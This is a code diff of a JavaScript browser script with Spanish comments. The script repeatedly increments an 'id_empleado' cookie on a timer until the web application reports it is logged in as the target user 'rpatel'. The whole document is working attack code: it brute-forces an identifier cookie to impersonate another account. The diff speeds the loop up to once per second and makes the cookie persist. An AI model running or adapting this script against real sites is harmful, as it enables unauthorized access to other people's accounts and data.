@@ -12,33 +12,28 @@ function aumentarCookie() {
   valorCookie++;
 
   // Establecer la nueva cookie con el valor aumentado
-  document.cookie = 'id_empleado=' + valorCookie;
+  document.cookie = 'id_empleado=' + valorCookie+'; expires=Thu, 01 Jan 2026 00:00:00 UTC; path=/';
 
 }
 
 // Función que busca un usuario en la cookie
-function bucleCooky(usuarioObjetivo) {
+function bucleCooky(usuarioObjetivo, tIntervaloMS) {
   let usrActual = encuentraUsuario(); // Obtiene el usuario actual
 
-  if (usrActual === usuarioObjetivo) {
-    // Si el usuario actual es el usuario objetivo, muestra un mensaje y detiene el cambio de usuario
-    console.log("¡Usuario encontrado!");
-    return;
-  }
-
   const intervalId = setInterval(() => {
-    aumentarCookie(); // Modifica la cookie con la que se hace la petición PHP
     username()
     usrActual = encuentraUsuario(); // Actualiza el usuario actual
-
     if (usrActual === usuarioObjetivo) {
       // Si se encuentra el usuario objetivo, muestra un mensaje y detiene el cambio de usuario
       alert("¡Usuario encontrado!");
       clearInterval(intervalId); // Detiene el intervalo
+      return;
     }
-  }, 10000);
+
+    aumentarCookie(); // Modifica la cookie con la que se hace la petición PHP
+  }, tIntervaloMS);
 }
 
-bucleCooky("rpatel"); // Llama a la función con el usuario a buscar
+bucleCooky("rpatel",1000); // Llama a la función con el usuario a buscar
 
 
